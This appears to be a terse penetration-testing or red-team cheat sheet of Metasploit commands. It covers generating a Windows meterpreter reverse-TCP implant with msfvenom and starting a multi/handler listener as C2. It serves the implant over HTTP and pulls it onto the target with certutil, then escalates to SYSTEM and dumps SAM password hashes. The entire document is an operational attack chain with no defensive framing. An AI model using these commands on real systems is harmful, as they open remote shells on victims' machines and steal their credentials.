# msf
## generate implant  
msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=443 LHOST=<OWN IP || INTERFACE> -f exe -o implant.exe  
## start c2  
msfconsole  
use exploit/multi/handler  
set payload windows/x64/meterpreter_reverse_tcp  
set lport 443  
set lhost <OWN IP || INTERFACE>  
run -j  
## start webserver for implant download
python3 -m http.server 80
## windows LOLBIN basic download of implant
certutil -urlcache -f http://<OWN IP>/implant.exe implant.exe  

# IAoT
## attempt to get SYSTEM privs
getsystem  
## dump SAM
hashdump
